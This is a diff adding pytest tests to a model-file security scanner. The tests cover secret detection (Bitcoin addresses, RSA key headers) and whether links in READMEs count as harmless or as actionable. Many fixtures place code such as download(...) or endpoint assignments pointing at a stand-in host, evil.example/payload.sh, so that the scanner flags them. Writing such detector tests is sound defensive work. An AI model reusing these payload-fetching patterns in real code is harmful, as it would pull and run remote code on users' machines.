@@ -1,7 +1,7 @@
 import base64
 import hashlib
 import json
-from collections.abc import Iterator
+from collections.abc import Callable, Iterator
 from pathlib import Path
 from typing import Any
 
@@ -1205,6 +1205,35 @@ def test_text_scanner_detects_valid_authorization_basic_credentials(tmp_path: Pa
     assert failed_secret_checks[0].details["redacted_value"] == "Basic dXNlcjpwYXNz"
 
 
+def test_readme_bitcoin_addresses_require_a_valid_base58check_payload(tmp_path: Path) -> None:
+    # Synthetic mainnet P2PKH (two leading zero bytes) and P2SH addresses.
+    addresses = ["11aEChfUaGVeaY89Dr4zSRPNM84JLGkcA", "31hb9kC72UasjkEZGKWfR4nKWsQmqGB7FA"]
+    notebook_ids = [
+        "11aEChfUaGVeaY89Dr4zSRPNM84JLGkcB",  # Wrong checksum
+        "11aEChfUaGVeaY89Dr4zSRPNM84JLGkcI",  # Invalid Base58 character
+        "118XddrVuPzhEVMCNwco6Jm37piUGuBn",  # Valid checksum, 19-byte hash
+        "3R3C8rVPjf3kZBNeHjqyuC479NfiWjJj1T",  # Valid checksum, wrong version
+    ]
+    readme = tmp_path / "README.md"
+    links = [f"https://colab.research.google.com/drive/{value}" for value in notebook_ids]
+    content = "\n".join([*links, *addresses, "-----BEGIN RSA PRIVATE KEY-----"])
+    readme.write_bytes(content.encode("utf-8"))
+
+    result = scan_file(str(readme), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "text"
+    failed_checks = [
+        check
+        for check in result.checks
+        if check.name == "Embedded Secrets Detection" and check.status == CheckStatus.FAILED
+    ]
+    bitcoin_positions = [
+        check.details["position"] for check in failed_checks if check.details["secret_type"] == "Bitcoin Address"
+    ]
+    assert sorted(bitcoin_positions) == [content.index(address) for address in addresses]
+    assert any(check.details["secret_type"] == "RSA Private Key" for check in failed_checks)
+
+
 @pytest.mark.parametrize(
     ("filename", "content", "token"),
     [
@@ -1791,6 +1820,49 @@ def test_text_scanner_model_card_capitalized_bullet_label_markdown_links_stay_in
     _assert_model_card_endpoint_informational(tmp_path, content)
 
 
+def test_inline_html_citations_after_a_sentence_are_informational(tmp_path: Path) -> None:
+    path = tmp_path / "README.md"
+    content = (
+        'Results match prior evaluations. (see <a href="https://tracker.example.org/a">1</a>\n'
+        '<a href="https://tracker.example.org/b">2</a> <a href="https://tracker.example.org/c">3</a>)\n'
+    )
+    result = _scan_text_content(path, content)
+    urls = [check for check in result.checks if check.details.get("type") == "url_detected"]
+    assert len(urls) == 3 and all(check.severity == IssueSeverity.INFO for check in urls)
+    assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 0
+
+
+def test_documented_issue_label_does_not_open_a_call_around_later_link(tmp_path: Path) -> None:
+    path = tmp_path / "README.md"
+    content = (
+        "> Supported in [runtime](https://tracker.example.org/runtime) and newer "
+        "([#12](https://tracker.example.org/issues/12)).\n\n"
+        "Example usage with [runtime](https://tracker.example.org/guide):\n"
+    )
+    path.write_bytes(content.encode())
+    scan = scan_model_directory_or_file(str(path), cache_enabled=False)
+    guide_position = path.read_bytes().index(b"https://tracker.example.org/guide")
+    guide = [issue for issue in scan.issues if issue.details and issue.details.get("position") == guide_position]
+    assert guide and all(issue.severity == IssueSeverity.INFO for issue in guide)
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        """client.fetch('see <a href="https://evil.example/payload.sh">download</a>')""",
+        """client.fetch(  # [#12](https://tracker.example.org/issues/12))
+    '[download](https://evil.example/payload.sh)'
+)""",
+        """with client.fetch(#935) before continuing.
+    '[download](https://evil.example/payload.sh)'
+):
+    pass""",
+    ],
+)
+def test_html_and_issue_citations_preserve_actual_enclosing_calls(tmp_path: Path, content: str) -> None:
+    _assert_model_card_payload_endpoint_actionable(tmp_path, content)
+
+
 def test_text_scanner_markdown_link_context_prefix_remains_bounded() -> None:
     payload = b"intro\n" + (b"a" * (MAX_TEXT_FINDING_CONTEXT_BYTES * 4)) + b"\n[API docs](https://docs.example.com)\n"
     position = payload.index(b"https://")
@@ -2265,6 +2337,360 @@ def test_text_scanner_model_card_markdown_link_string_endpoint_remains_actionabl
     _assert_model_card_endpoint_evidence(tmp_path, ('endpoint = "[download](https://evil.example/payload.sh)"\n'))
 
 
+@pytest.mark.parametrize(
+    "prefix",
+    [
+        'The literal "; b=\'text"',
+        "The literal '; b=\"text'",
+        '文字列 "; b=\'text"',
+        "The literal `; b='text`",
+        'The literal ``; b="text``',
+        "The literal ```; b='text```",
+        "文字列 `; b='text`",
+        "The literal ``; b='text ` nested``",
+    ],
+)
+def test_text_scanner_quoted_prose_assignment_is_informational(tmp_path: Path, prefix: str) -> None:
+    _assert_model_card_endpoint_informational(tmp_path, prefix + " is described by [guide](https://docs.example.com)\n")
+
+
+@pytest.mark.parametrize(
+    "leading",
+    [
+        "unmatched `\n",
+        "unmatched `\r\n",
+        "unmatched `\r",
+        "unmatched `` ",
+        "unmatched ``` `` ",
+        "escaped \\` ",
+        "unmatched ``\nunfinished ```\n",
+    ],
+)
+@pytest.mark.parametrize("executable", [False, True])
+def test_text_scanner_unmatched_markers_do_not_consume_later_inline_examples(
+    tmp_path: Path, leading: str, executable: bool
+) -> None:
+    content = leading + (
+        "The literal `; b='[download](https://evil.example/payload.sh)`\n"
+        if executable
+        else "The literal `; b='text` is described by [guide](https://docs.example.com)\n"
+    )
+    path = tmp_path / "README.md"
+    path.write_bytes(content.encode("utf-8"))
+    result = TextScanner(config={"check_secrets": False}).scan(str(path))
+    checks = [check for check in result.checks if check.details.get("type") == "url_detected"]
+    assert checks
+    assert any(check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in checks) is executable
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False, check_secrets=False)
+    assert determine_exit_code(aggregate) == int(executable)
+
+
+@pytest.mark.parametrize("prefix", ['example = "; b=\'text"; ', 'example = "文字列"; '])
+def test_text_scanner_assignment_after_quoted_literal_remains_actionable(tmp_path: Path, prefix: str) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path, prefix + 'endpoint="' + "x" * 8192 + '[download](https://evil.example/payload.sh)"\n'
+    )
+
+
+@pytest.mark.parametrize(
+    "prefix,suffix",
+    [
+        ("The literal `; b='", "`"),
+        ("The literal ``; b='", "``"),
+        ("The literal `; b='", ""),
+        ("The literal ``; b='text` ", ""),
+        ("The literal \\`; b='text` ", ""),
+        ("The literal `; b='text` is shown; endpoint='", "'"),
+        ("endpoint=\"text `; b='text` ", '"'),
+    ],
+)
+def test_text_scanner_inline_code_does_not_hide_real_assignment_values(
+    tmp_path: Path, prefix: str, suffix: str
+) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path, prefix + "[download](https://evil.example/payload.sh)" + suffix + "\n"
+    )
+
+
+def test_documentation_quote_windows_reuse_indexes_without_copying_and_preserve_source_identity(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    source = b"plain\n" * 100_000
+    original = TextScanner._documentation_quoted_assignment_index
+    indexed_sizes: list[int] = []
+
+    def record_index(context: bytes) -> tuple[memoryview, memoryview]:
+        indexed_sizes.append(len(context))
+        return original(context)
+
+    monkeypatch.setattr(TextScanner, "_documentation_quoted_assignment_index", staticmethod(record_index))
+    windows: dict[int, tuple[memoryview, memoryview]] = {}
+    token = text_scanner_module._DOCUMENTATION_QUOTE_WINDOWS.set((source, windows))
+    try:
+        for index in range(1024):
+            start = index * 6
+            assert not TextScanner._documentation_has_open_quoted_assignment(source, start, start + 5)
+        assert indexed_sizes == [2 * 256 * 1024]
+        other_source = b'endpoint="[download]'
+        assert TextScanner._documentation_has_open_quoted_assignment(other_source)
+        assert indexed_sizes == [2 * 256 * 1024, len(other_source)]
+    finally:
+        text_scanner_module._DOCUMENTATION_QUOTE_WINDOWS.reset(token)
+
+
+def test_documentation_quote_windows_are_bounded() -> None:
+    source = b"plain\n" * 300_000
+    windows: dict[int, tuple[memoryview, memoryview]] = {}
+    token = text_scanner_module._DOCUMENTATION_QUOTE_WINDOWS.set((source, windows))
+    try:
+        for index in range(6):
+            start = (index * 256 * 1024) // 6 * 6
+            assert not TextScanner._documentation_has_open_quoted_assignment(source, start, start + 5)
+        assert len(windows) == 4
+    finally:
+        text_scanner_module._DOCUMENTATION_QUOTE_WINDOWS.reset(token)
+
+
+@pytest.mark.parametrize("fail_detector", [False, True])
+def test_text_scanner_releases_quote_windows_after_scan(tmp_path: Path, fail_detector: bool) -> None:
+    path = tmp_path / "README.md"
+    path.write_text("See [guide](https://docs.example.com)\n")
+    scanner_type = _FailingNetworkDetectorTextScanner if fail_detector else TextScanner
+    scanner = scanner_type(config={"check_secrets": False})
+    parent_context: tuple[bytes, dict[int, tuple[memoryview, memoryview]]] = (b"parent", {})
+    token = text_scanner_module._DOCUMENTATION_QUOTE_WINDOWS.set(parent_context)
+    try:
+        result = scanner.scan(str(path))
+        assert result.success is not fail_detector
+        assert text_scanner_module._DOCUMENTATION_QUOTE_WINDOWS.get() is parent_context
+        assert parent_context[1] == {}
+    finally:
+        text_scanner_module._DOCUMENTATION_QUOTE_WINDOWS.reset(token)
+
+
+@pytest.mark.parametrize("assigned", [False, True])
+def test_text_scanner_reuses_quote_analysis_across_many_links(tmp_path: Path, assigned: bool) -> None:
+    links = " ".join("x" * 128 + f"[guide](https://docs.example.com/reference/{index})" for index in range(64))
+    content = f'endpoint = "{links}"\n' if assigned else links + "\n"
+    TextScanner._documentation_quoted_assignment_index.cache_clear()
+    result = _scan_text_content(tmp_path / "README.md", content)
+    checks = [check for check in result.checks if check.details.get("type") == "url_detected"]
+    assert len(checks) == 64
+    assert all((check.severity != IssueSeverity.INFO) == assigned for check in checks)
+    assert TextScanner._documentation_quoted_assignment_index.cache_info().misses <= 2
+    TextScanner._documentation_quoted_assignment_index.cache_clear()
+
+
+def test_documentation_quote_index_retains_compact_read_only_storage() -> None:
+    context = b';a=""\n' * ((2 * 256 * 1024) // 6)
+    TextScanner._documentation_quoted_assignment_index.cache_clear()
+    positions, starts = TextScanner._documentation_quoted_assignment_index(context)
+    assert positions.readonly and starts.readonly
+    assert len(positions) == len(starts)
+    assert positions.nbytes + starts.nbytes <= 4 * len(context) + 32
+    assert TextScanner._documentation_has_open_quoted_assignment(context, 0, 4)
+    assert not TextScanner._documentation_has_open_quoted_assignment(context, 0, 5)
+    TextScanner._documentation_quoted_assignment_index.cache_clear()
+
+
+def test_documentation_quote_index_skips_tokenization_without_assignments(monkeypatch: pytest.MonkeyPatch) -> None:
+    def unexpected_tokenization(_readline: Callable[[], str]) -> Iterator[text_scanner_module.tokenize.TokenInfo]:
+        raise AssertionError("A window without assignment candidates must not be tokenized")
+
+    monkeypatch.setattr(text_scanner_module.tokenize, "generate_tokens", unexpected_tokenization)
+    source = b"Z " + b" " * (2 * 256 * 1024 - 32) + b"` [guide]"
+    TextScanner._documentation_quoted_assignment_index.cache_clear()
+    budget_token = text_scanner_module._DOCUMENTATION_QUOTE_BUDGET.set(0)
+    try:
+        assert not TextScanner._documentation_has_open_quoted_assignment(source)
+        assert text_scanner_module._DOCUMENTATION_QUOTE_BUDGET.get() == 0
+    finally:
+        text_scanner_module._DOCUMENTATION_QUOTE_BUDGET.reset(budget_token)
+        TextScanner._documentation_quoted_assignment_index.cache_clear()
+
+
+@pytest.mark.parametrize("word", ["item", "élément"])
+def test_documentation_quote_index_allows_dense_valid_token_lines(word: str) -> None:
+    source = ("Z; (" + f"{word}, " * 18000 + '); message="literal ; inner=\'text"\n').encode()
+    TextScanner._documentation_quoted_assignment_index.cache_clear()
+    try:
+        assert not TextScanner._documentation_has_open_quoted_assignment(source, 0, len(source) - 1)
+        assert TextScanner._documentation_quoted_assignment_index.cache_info().currsize == 1
+    finally:
+        TextScanner._documentation_quoted_assignment_index.cache_clear()
+
+
+def test_text_scanner_dense_valid_quote_context_keeps_completed_security_verdict(tmp_path: Path) -> None:
+    path = tmp_path / "README.md"
+    path.write_text("Z; (" + "item, " * 18000 + '); value="[guide](https://docs.example.com)"\n')
+    result = TextScanner(config={"check_secrets": False}).scan(str(path))
+    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
+    assert not any(
+        check.name == "Text Content Security Coverage" and check.status == CheckStatus.FAILED for check in result.checks
+    )
+    assert any(
+        check.details.get("type") == "url_detected"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False, check_secrets=False)
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize("simulate_error_tokens", [False, True])
+def test_documentation_quote_index_bounds_repeated_tokenizer_line_work(
+    monkeypatch: pytest.MonkeyPatch, simulate_error_tokens: bool
+) -> None:
+    source = b"Z " + b" " * 2048 + b"` ;b='text'"
+    original = text_scanner_module.tokenize.generate_tokens
+    emitted = 0
+
+    def counted(readline: Callable[[], str]) -> Iterator[text_scanner_module.tokenize.TokenInfo]:
+        nonlocal emitted
+        if simulate_error_tokens:
+            line = readline()
+            items = (
+                text_scanner_module.tokenize.TokenInfo(
+                    text_scanner_module.token.ERRORTOKEN, character, (1, index), (1, index + 1), line
+                )
+                for index, character in enumerate(line)
+            )
+        else:
+            items = original(readline)
+        for item in items:
+            emitted += 1
+            yield item
+
+    monkeypatch.setattr(text_scanner_module.tokenize, "generate_tokens", counted)
+    monkeypatch.setattr(text_scanner_module, "MAX_DOCUMENTATION_QUOTE_PARSE_WORK", 3 * len(source))
+    TextScanner._documentation_quoted_assignment_index.cache_clear()
+    try:
+        assert TextScanner._documentation_has_open_quoted_assignment(source, 0, source.index(b"text"))
+    except text_scanner_module._DocumentationQuoteBudgetExceeded:
+        assert TextScanner._documentation_quoted_assignment_index.cache_info().currsize == 0
+    else:
+        # Newer Python tokenizers can skip the whitespace and finish within the allowance.
+        assert not simulate_error_tokens
+    assert 0 < emitted <= 3
+    TextScanner._documentation_quoted_assignment_index.cache_clear()
+
+
+def test_documentation_quote_budget_is_shared_and_does_not_cache_failures() -> None:
+    first = b'a="first'
+    second = b'b="second'
+    TextScanner._documentation_quoted_assignment_index.cache_clear()
+    budget_token = text_scanner_module._DOCUMENTATION_QUOTE_BUDGET.set(len(first))
+    try:
+        assert TextScanner._documentation_has_open_quoted_assignment(first)
+        assert text_scanner_module._DOCUMENTATION_QUOTE_BUDGET.get() == 0
+        assert TextScanner._documentation_has_open_quoted_assignment(first)
+        with pytest.raises(text_scanner_module._DocumentationQuoteBudgetExceeded):
+            TextScanner._documentation_has_open_quoted_assignment(second)
+        assert TextScanner._documentation_quoted_assignment_index.cache_info().currsize == 1
+        text_scanner_module._DOCUMENTATION_QUOTE_BUDGET.set(len(second))
+        assert TextScanner._documentation_has_open_quoted_assignment(second)
+        assert text_scanner_module._DOCUMENTATION_QUOTE_BUDGET.get() == 0
+    finally:
+        text_scanner_module._DOCUMENTATION_QUOTE_BUDGET.reset(budget_token)
+        TextScanner._documentation_quoted_assignment_index.cache_clear()
+
+
+@pytest.mark.parametrize(
+    "content,completed_exit_code",
+    [
+        ('The literal "; b=\'text" is described by [guide](https://docs.example.com)\n', 0),
+        ('endpoint="[download](https://evil.example/payload.sh)"\n', 1),
+    ],
+)
+def test_text_scanner_quote_limit_retains_findings_and_is_not_cached(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, content: str, completed_exit_code: int
+) -> None:
+    path = tmp_path / "README.md"
+    path.write_text(content)
+    TextScanner._documentation_quoted_assignment_index.cache_clear()
+    cache_dir = tmp_path / "cache"
+    with monkeypatch.context() as limited, IsolatedCacheManager(reset_cache_manager):
+        limited.setattr(text_scanner_module, "MAX_DOCUMENTATION_QUOTE_PARSE_WORK", 0)
+        result = TextScanner(config={"check_secrets": False}).scan(str(path))
+        assert result.success is False
+        assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+        assert result.metadata.get("operational_error_reason") == "text_content_security_classification_limit"
+        assert any(
+            check.name == "Text Content Security Coverage"
+            and check.message == "Text network finding classification exceeded the work limit"
+            and check.details.get("classification_limit_sources") == ["documentation_quote_context"]
+            and check.details.get("max_documentation_quote_parse_work") == 0
+            for check in result.checks
+        )
+        assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+        for _ in range(2):
+            aggregate = scan_model_directory_or_file(
+                str(path), cache_enabled=True, cache_dir=str(cache_dir), min_cache_file_size=0, check_secrets=False
+            )
+            assert aggregate.success is False
+            assert determine_exit_code(aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    assert text_scanner_module._DOCUMENTATION_QUOTE_BUDGET.get() is None
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False, check_secrets=False)
+    assert aggregate.success is True
+    assert determine_exit_code(aggregate) == completed_exit_code
+    TextScanner._documentation_quoted_assignment_index.cache_clear()
+
+
+@pytest.mark.parametrize("prefix", ["endpoint = '", 'endpoint: "', 'download("', "endpoint =\n"])
+def test_text_scanner_long_html_assignment_context_remains_actionable(tmp_path: Path, prefix: str) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path, prefix + " " * 5120 + '<a href="https://evil.example/payload.sh">download</a>\n'
+    )
+
+
+@pytest.mark.parametrize("prefix", [b"endpoint = '", b'endpoint: "', b'download("', b"endpoint =\n"])
+def test_text_scanner_html_context_beyond_lookback_remains_actionable(prefix: bytes) -> None:
+    payload = prefix + b" " * (256 * 1024 + 1) + b'<a href="https://evil.example/payload.sh">download</a>\n'
+    assert TextScanner._documentation_finding_is_actionable(payload, {"position": payload.index(b"https://")})
+
+
+@pytest.mark.parametrize("prefix", ["", 'endpoint = "closed" ', 'endpoint = "closed"\n'])
+def test_text_scanner_long_html_whitespace_without_open_assignment_is_informational(
+    tmp_path: Path, prefix: str
+) -> None:
+    _assert_model_card_endpoint_informational(
+        tmp_path, prefix + " " * 5120 + '<a href="https://docs.example.com/reference">guide</a>\n'
+    )
+
+
+@pytest.mark.parametrize(
+    "source,marker,expected",
+    [
+        (b'a="escaped\\"[link]', b"[link]", True),
+        (b'a="closed" [link]', b"[link]", False),
+        (b"a='doubled''[link]", b"[link]", True),
+        (b"a='closed' [link]", b"[link]", False),
+        (b"a=';b=''[link]", b"[link]", True),
+        (b'a="line\\\n[link]', b"[link]", True),
+        (b'a="line\\\r\n[link]', b"[link]", True),
+        (b'a="line\r\n[link]', b"[link]", False),
+        (b'a="line\n[link]', b"[link]", False),
+        (b"a=`escaped\\`[link]", b"[link]", True),
+        (b"a=`closed` [link]", b"[link]", False),
+    ],
+)
+def test_documentation_quote_index_preserves_escape_and_doubled_quote_states(
+    source: bytes, marker: bytes, expected: bool
+) -> None:
+    end = source.index(marker)
+    assert TextScanner._documentation_has_open_quoted_assignment(source, 0, end) is expected
+
+
+@pytest.mark.parametrize("padding", [0, 256 * 1024 - 8, 256 * 1024 + 8])
+def test_documentation_quote_index_respects_context_and_window_boundaries(padding: int) -> None:
+    source = b"x" * padding + b'\nclosed="value"\nendpoint="[link]\nplain [next]'
+    start = source.index(b"endpoint=")
+    assert TextScanner._documentation_has_open_quoted_assignment(source, start, source.index(b"[link]"))
+    next_start = source.index(b"plain")
+    assert not TextScanner._documentation_has_open_quoted_assignment(source, next_start, source.index(b"[next]"))
+
+
 def test_text_scanner_model_card_markdown_link_return_remains_actionable(tmp_path: Path) -> None:
     _assert_model_card_endpoint_evidence(
         tmp_path, ('def endpoint():\n    return "[download](https://evil.example/payload.sh)"\n')
@@ -2286,6 +2712,172 @@ def test_text_scanner_model_card_multiline_markdown_link_return_remains_actionab
 def test_text_scanner_model_card_wrapped_call_markdown_link_remains_actionable(tmp_path: Path) -> None:
     _assert_model_card_endpoint_evidence(
         tmp_path, ('download(\n    "[download](https://evil.example/payload.sh)"\n)\n')
+    )
+
+
+@pytest.mark.parametrize("indent", ["", "    "])
+@pytest.mark.parametrize("prefix", ["", "prefix ) "])
+@pytest.mark.parametrize("tag", ["", "String.raw"])
+def test_text_scanner_model_card_wrapped_template_literal_markdown_link_remains_actionable(
+    tmp_path: Path, tag: str, prefix: str, indent: str
+) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path, f"{indent}download(\n    {tag}`{prefix}[download](https://evil.example/payload.sh)`\n{indent})\n"
+    )
+
+
+def test_text_scanner_model_card_wrapped_long_literal_markdown_link_remains_actionable(tmp_path: Path) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path,
+        'download(\n    "'
+        + "x" * (MAX_TEXT_FINDING_CONTEXT_BYTES + 1)
+        + '[download](https://evil.example/payload.sh)"\n)\n',
+    )
+
+
+@pytest.mark.parametrize(
+    "literal_prefix,literal_suffix",
+    [("", ""), ('r#"', '"#'), ("source ", ""), ("--url ", ""), ("r's ", "'"), ("'x' and's ", "'")],
+)
+def test_text_scanner_markdown_link_in_open_call_remains_actionable(
+    tmp_path: Path, literal_prefix: str, literal_suffix: str
+) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path, f"download(\n    {literal_prefix}[download](https://evil.example/payload.sh){literal_suffix}\n)\n"
+    )
+
+
+@pytest.mark.parametrize("fence", ["```", "~~~", "````"])
+def test_text_scanner_incomplete_fence_preserves_open_call(tmp_path: Path, fence: str) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path, f"download(\n{fence}\n[payload](https://evil.example/payload.sh)\n)\n"
+    )
+
+
+@pytest.mark.parametrize("fence", ["```", "~~~", "````"])
+@pytest.mark.parametrize("quote", ["", '"""'])
+def test_text_scanner_fence_in_open_call_literal_remains_actionable(tmp_path: Path, fence: str, quote: str) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path,
+        f"download({quote}\n{fence}text\nexample\n{fence}\n[payload](https://evil.example/payload.sh)\n{quote})\n",
+    )
+
+
+@pytest.mark.parametrize("fence", ["```", "~~~"])
+def test_text_scanner_fence_opener_outside_context_keeps_call_actionable(tmp_path: Path, fence: str) -> None:
+    content = f"{fence}text\n" + "x" * MAX_TEXT_FINDING_CONTEXT_BYTES + f"\n{fence}\n"
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path, content + f"download(\n{fence}\n[payload](https://evil.example/payload.sh)\n)\n"
+    )
+
+
+def test_text_scanner_fence_context_limits_call_probes(monkeypatch: pytest.MonkeyPatch) -> None:
+    from modelaudit.scanners.text_scanner import MAX_TEXT_FENCE_CONTEXT_BYTES, MAX_TEXT_FENCE_MARKERS
+
+    probes = 0
+
+    def open_call(_prefix: bytes) -> bool:
+        nonlocal probes
+        probes += 1
+        return True
+
+    monkeypatch.setattr(TextScanner, "_documentation_prefix_has_enclosing_call", staticmethod(open_call))
+    TextScanner._documentation_fence_boundaries.cache_clear()
+    payload = b"```\n" * (MAX_TEXT_FENCE_MARKERS + 10)
+    assert TextScanner._documentation_last_closed_fence_end(payload, 0, len(payload)) == 0
+    for end in range(4, len(payload), 4):
+        assert TextScanner._documentation_last_closed_fence_end(payload, 0, end) == 0
+    assert probes <= MAX_TEXT_FENCE_MARKERS
+    probes = 0
+    oversized = b"x" * (MAX_TEXT_FENCE_CONTEXT_BYTES + 1)
+    assert TextScanner._documentation_last_closed_fence_end(oversized, 1, len(oversized)) == 1
+    assert probes == 0
+    TextScanner._documentation_fence_boundaries.cache_clear()
+
+
+@pytest.mark.parametrize("fence", ["```", "~~~", "````"])
+@pytest.mark.parametrize("example", ['download(\n    "local"\n)\n', "download(\n"])
+@pytest.mark.parametrize("padding", [0, MAX_TEXT_FINDING_CONTEXT_BYTES + 16])
+def test_text_scanner_closed_fence_does_not_extend_call_into_prose(
+    tmp_path: Path, fence: str, example: str, padding: int
+) -> None:
+    _assert_model_card_endpoint_informational(
+        tmp_path, "x" * padding + f"\n{fence}python\n{example}{fence}\n[guide](https://docs.example.com/reference)\n"
+    )
+
+
+@pytest.mark.parametrize("padding", [MAX_TEXT_FINDING_CONTEXT_BYTES, MAX_TEXT_FINDING_CONTEXT_BYTES * 2])
+@pytest.mark.parametrize("prefix", ["", 'endpoint = "closed"\n'])
+def test_text_scanner_deeply_indented_passive_link_is_informational(tmp_path: Path, padding: int, prefix: str) -> None:
+    _assert_model_card_endpoint_informational(
+        tmp_path, prefix + " " * padding + "[guide](https://docs.example.com/reference)\n"
+    )
+
+
+@pytest.mark.parametrize("padding", [MAX_TEXT_FINDING_CONTEXT_BYTES - 16, MAX_TEXT_FINDING_CONTEXT_BYTES + 16])
+def test_text_scanner_long_prose_before_markdown_link_is_informational(tmp_path: Path, padding: int) -> None:
+    _assert_model_card_endpoint_informational(
+        tmp_path, "Documentation " + "a" * padding + " [guide](https://docs.example.com/reference)\n"
+    )
+
+
+@pytest.mark.parametrize("opening,closing", [("[", "]"), ("{", "}"), ("(", ")")])
+def test_text_scanner_indented_markdown_in_literal_remains_actionable(
+    tmp_path: Path, opening: str, closing: str
+) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path, f"endpoint = {opening}\n    [payload](https://evil.example/payload.sh)\n{closing}\n"
+    )
+
+
+@pytest.mark.parametrize("quote", ["'", '"', "`"])
+def test_text_scanner_long_quoted_assignment_markdown_remains_actionable(tmp_path: Path, quote: str) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path,
+        f"endpoint = {quote}" + "padding " * 800 + f"[payload](https://evil.example/payload.sh){quote}\n",
+    )
+
+
+@pytest.mark.parametrize("quote", ["'", '"', "`"])
+@pytest.mark.parametrize("padding", [MAX_TEXT_FINDING_CONTEXT_BYTES + 1, MAX_TEXT_FINDING_CONTEXT_BYTES * 2])
+def test_text_scanner_long_gap_before_quoted_assignment_remains_actionable(
+    tmp_path: Path, quote: str, padding: int
+) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path, "endpoint =" + " " * padding + f"{quote}[payload](https://evil.example/payload.sh){quote}\n"
+    )
+
+
+@pytest.mark.parametrize("quote", ["'", '"', "`"])
+def test_text_scanner_closed_long_gap_assignment_before_prose_link_is_informational(tmp_path: Path, quote: str) -> None:
+    _assert_model_card_endpoint_informational(
+        tmp_path,
+        "endpoint ="
+        + " " * (MAX_TEXT_FINDING_CONTEXT_BYTES * 2)
+        + f"{quote}closed{quote} See [guide](https://docs.example.com/reference)\n",
+    )
+
+
+def test_text_scanner_many_escaped_assignment_fragments_before_prose_link(tmp_path: Path) -> None:
+    _assert_model_card_endpoint_informational(
+        tmp_path, '; x=\\"' * 4000 + '" See [guide](https://docs.example.com/reference)\n'
+    )
+
+
+@pytest.mark.parametrize("prefix", ["endpoint:\n", "endpoint =\n"])
+def test_text_scanner_long_indented_config_markdown_link_remains_actionable(tmp_path: Path, prefix: str) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path, prefix + " " * (MAX_TEXT_FINDING_CONTEXT_BYTES + 16) + "[download](https://evil.example/payload.sh)\n"
+    )
+
+
+@pytest.mark.parametrize("padding", [MAX_TEXT_FINDING_CONTEXT_BYTES - 16, MAX_TEXT_FINDING_CONTEXT_BYTES + 16])
+@pytest.mark.parametrize("prefix,suffix", [('download("', '")'), ('endpoint = "', '"'), ('endpoint: "', '"')])
+def test_text_scanner_long_executable_markdown_link_stays_actionable(
+    tmp_path: Path, padding: int, prefix: str, suffix: str
+) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path, prefix + "a" * padding + " [download](https://evil.example/payload.sh)" + suffix + "\n"
     )
 
 
@@ -2391,6 +2983,214 @@ def test_text_scanner_documentation_open_call_ignores_zero_indent_passive_near_m
 )
 def test_text_scanner_documentation_enclosing_call_ignores_markdown_table_call_literals(prefix: bytes) -> None:
     assert not TextScanner._documentation_prefix_has_enclosing_call(prefix)
+
+
+def test_text_scanner_many_contractions_before_passive_links_avoid_reparsing(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    parsed_bytes = 0
+    original = TextScanner._documentation_prefix_has_enclosing_call
+
+    def counted(prefix: bytes) -> bool:
+        nonlocal parsed_bytes
+        parsed_bytes += len(prefix)
+        return original(prefix)
+
+    monkeypatch.setattr(TextScanner, "_documentation_prefix_has_enclosing_call", staticmethod(counted))
+    content = ("''\nIt's\n" * 512 + "[guide](https://docs.example.com/reference)\n") * 16
+    TextScanner._documentation_open_call_prefix_status.cache_clear()
+    _assert_documentation_informational(tmp_path, content)
+    assert parsed_bytes <= 4 * len(content)
+    TextScanner._documentation_open_call_prefix_status.cache_clear()
+
+
+def test_documentation_call_context_bounds_reparsing_and_reuses_results(monkeypatch: pytest.MonkeyPatch) -> None:
+    parsed_bytes = 0
+    original = TextScanner._documentation_prefix_has_enclosing_call
+
+    def counted(prefix: bytes) -> bool:
+        nonlocal parsed_bytes
+        parsed_bytes += len(prefix)
+        return original(prefix)
+
+    monkeypatch.setattr(TextScanner, "_documentation_prefix_has_enclosing_call", staticmethod(counted))
+    content = b"''\nIt's (a)\n" * 256 + b"[guide](https://docs.example.com/reference)\n"
+    position = content.index(b"https://")
+    TextScanner._documentation_open_call_prefix_status.cache_clear()
+    assert TextScanner._documentation_open_call_context_status(content, position) is None
+    assert 0 < parsed_bytes <= text_scanner_module.MAX_DOCUMENTATION_CALL_PARSE_BYTES
+    first_parse_bytes = parsed_bytes
+    assert TextScanner._documentation_open_call_contains_position(content, position)
+    assert parsed_bytes == first_parse_bytes
+    TextScanner._documentation_open_call_prefix_status.cache_clear()
+
+
+def test_documentation_call_context_does_not_cache_oversized_prefixes() -> None:
+    content = (
+        b"download(\n" + b" " * text_scanner_module.MAX_DOCUMENTATION_CALL_CONTEXT_BYTES + b'"https://example.com"'
+    )
+    TextScanner._documentation_open_call_prefix_status.cache_clear()
